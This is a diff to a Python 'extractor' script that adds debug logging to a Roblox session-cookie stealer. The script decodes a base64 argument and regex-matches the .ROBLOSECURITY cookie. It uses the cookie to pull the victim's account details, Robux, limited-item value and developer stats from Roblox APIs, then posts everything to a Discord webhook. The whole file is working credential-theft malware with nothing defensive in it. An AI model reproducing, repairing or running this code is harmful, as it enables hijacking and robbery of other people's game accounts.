@@ -8,28 +8,36 @@ from datetime import datetime, timezone
 def safe_get(url, headers=None, default=None):
     try:
         res = requests.get(url, headers=headers, timeout=10)
+        print(f"DEBUG GET {url} -> Status: {res.status_code}", file=sys.stderr)
         if res.status_code == 200:
             return res.json()
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"DEBUG GET Exception on {url}: {e}", file=sys.stderr)
     return default
 
 def main():
     try:
+        print("DEBUG: Extractor started", file=sys.stderr)
         if len(sys.argv) < 2:
+            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
             return
         
         try:
             decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
-        except Exception:
+        except Exception as e:
+            print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
             return
 
         webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
         if not webhook_url:
+            print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
             return
+        else:
+            print("DEBUG: Webhook URL found", file=sys.stderr)
 
         match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
         if not match:
+            print("DEBUG: .ROBLOSECURITY pattern match failed in payload", file=sys.stderr)
             return
 
         roblosecurity = match.group(1)
@@ -44,10 +52,12 @@ def main():
         # 1. Authenticated User Info
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         if not user_data:
+            print("DEBUG: Failed to authenticate user with Roblox API using cookie", file=sys.stderr)
             return
 
         username = user_data.get("name", "Unknown")
         user_id = user_data.get("id", 0)
+        print(f"DEBUG: Authenticated as {username} (ID: {user_id})", file=sys.stderr)
 
         # 2. Account Age
         account_age_days = 0
@@ -70,7 +80,7 @@ def main():
             if cur.get("amount"):
                 pending_robux += cur.get("amount")
 
-        # 4. RAP & Limiteds (Using Rolimons v1 playeritems endpoint correctly)
+        # 4. RAP & Limiteds
         rap = 0
         limiteds_count = 0
         rolimons_data = safe_get(f"https://www.rolimons.com/api/playeritems/{user_id}")
@@ -79,7 +89,6 @@ def main():
             limiteds_count = len(player_assets)
             for asset_id, item_details in player_assets.items():
                 if isinstance(item_details, list) and len(item_details) > 2:
-                    # Rolimons format: [asset_status, value, rap, ...]
                     rap += item_details[2]
 
         # 5. Games & Developer Stats
@@ -160,10 +169,11 @@ def main():
             }]
         }
 
-        requests.post(webhook_url, json=payload, timeout=10)
+        res = requests.post(webhook_url, json=payload, timeout=10)
+        print(f"DEBUG: Discord Webhook Post Status: {res.status_code}", file=sys.stderr)
 
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"DEBUG: Critical Exception in main: {e}", file=sys.stderr)
 
 if __name__ == "__main__":
     main()
